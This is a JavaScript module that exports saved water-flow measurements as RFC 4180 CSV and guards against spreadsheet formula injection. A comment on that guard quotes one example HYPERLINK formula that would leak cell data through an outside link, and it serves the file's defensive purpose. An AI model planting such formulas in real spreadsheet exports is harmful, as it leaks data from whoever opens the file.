/*
 * csv.js -- RFC 4180 CSV export of saved measurements. Pure, DOM-free.
 *
 * Three deliberate choices, all carried over from the iOS exporter so files
 * from either platform drop into the same spreadsheet unchanged:
 *   - Leading U+FEFF (BOM): Excel needs it to detect UTF-8; Numbers and Sheets
 *     tolerate it.
 *   - CRLF line endings: the RFC's terminator, and what Windows tooling wants.
 *   - Fixed decimal places rendered with plain "." separators regardless of the
 *     device locale, so a phone set to German doesn't emit "1,585" and turn one
 *     column into two.
 *
 * One unified column set spans all three measurement modes; the columns that
 * don't apply to a row are left empty rather than zero-filled, so "no elapsed
 * time" reads differently from "an elapsed time of zero".
 */
(function (root) {
  "use strict";
  const FR = (root.FloRun = root.FloRun || {});

  const HEADERS = [
    "ID",
    "Timestamp",
    "Method",
    "Elapsed (s)",
    "Volume",
    "Volume Unit",
    "Volume (US gal)",
    "Weir Type",
    "Head (in)",
    "GPM",
    "GPH",
    "GPD",
    "Chart Range",
    "Site Label",
    "Notes",
    "Latitude",
    "Longitude",
    "Location Accuracy (m)",
    "Photo",
  ];

  const CRLF = "\r\n";

  /*
   * Quote only when required (comma, quote, CR or LF present), doubling any
   * embedded quotes. Everything else passes through bare.
   */
  function escapeField(field) {
    if (field === null || field === undefined) return "";
    const s = String(field);
    if (s.indexOf(",") < 0 && s.indexOf('"') < 0 && s.indexOf("\n") < 0 && s.indexOf("\r") < 0) {
      return s;
    }
    return '"' + s.replace(/"/g, '""') + '"';
  }

  /* Fixed-decimal, locale-independent. Empty string for anything non-finite. */
  function fixed(value, digits) {
    const n = Number(value);
    if (value === null || value === undefined || !isFinite(n)) return "";
    return n.toFixed(digits);
  }

  /*
   * Flow figures at the same 4 significant figures the screen and the PDF use.
   * A fixed decimal count made a chart value read off a 4-figure table leave as
   * "6855.0000" -- eight significant figures, none of them earned.
   */
  function sig(value) {
    return FR.format.significantPlain(value, 4);
  }

  /*
   * Neutralize spreadsheet formula injection (CWE-1236). Excel, LibreOffice and
   * Sheets evaluate any cell whose text begins with = + - @ (or a leading tab
   * or CR), and RFC 4180 quoting does NOT prevent it: the quotes are stripped
   * during parsing and the formula runs. A note reading
   *   =HYPERLINK("http://.../?d="&A1,"Results")
   * becomes a live exfiltration link for whoever opens the export.
   *
   * The prefix is an apostrophe, per OWASP: spreadsheets treat it as "the rest
   * of this cell is literal text" and hide it. It does alter the byte sequence,
   * which is the deliberate trade -- a note that survives as text beats one
   * that arrives as #NAME?.
   *
   * Applied ONLY to free text. Numeric columns must never pass through here:
   * every southern-hemisphere latitude and western longitude begins with "-",
   * and quoting those would corrupt real data to guard against nothing.
   */
  function deFormula(text) {
    const s = String(text);
    return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
  }

  function rowFor(rec) {
    const core = FR.core;
    const isWeir = rec.mode === core.MODES.weir.id;
    const isTimed = rec.mode === core.MODES.timedVolume.id;

    return [
      rec.id,
      rec.timestamp,
      rec.mode,
      isTimed ? fixed(rec.elapsedSeconds, 3) : "",
      isTimed ? fixed(rec.volume, 4) : "",
      isTimed ? (rec.volumeUnit ? core.unitFor(rec.volumeUnit).displayName : "") : "",
      isTimed ? fixed(core.recordVolumeInUSGallons(rec), 4) : "",
      isWeir && rec.weirType ? FR.weir.typeFor(rec.weirType).displayName : "",
      isWeir ? fixed(rec.headInches, 3) : "",
      sig(rec.gpm),
      sig(rec.gph),
      sig(rec.gpd),
      core.rangeStatusFor(rec),
      deFormula(rec.siteLabel || ""),
      deFormula(rec.notes || ""),
      rec.latitude != null ? fixed(rec.latitude, 6) : "",
      rec.longitude != null ? fixed(rec.longitude, 6) : "",
      rec.locationAccuracyMeters != null ? fixed(rec.locationAccuracyMeters, 1) : "",
      rec.photoId || "",
    ];
  }

  /* Newest first, matching the on-screen history order. */
  function build(records) {
    const sorted = (records || []).slice().sort(function (a, b) {
      return new Date(b.timestamp) - new Date(a.timestamp);
    });
    let out = "﻿" + HEADERS.map(escapeField).join(",") + CRLF;
    for (let i = 0; i < sorted.length; i++) {
      out += rowFor(sorted[i]).map(escapeField).join(",") + CRLF;
    }
    return out;
  }

  FR.csv = { HEADERS, escapeField, deFormula, build, rowFor };
})(typeof self !== "undefined" ? self : this);
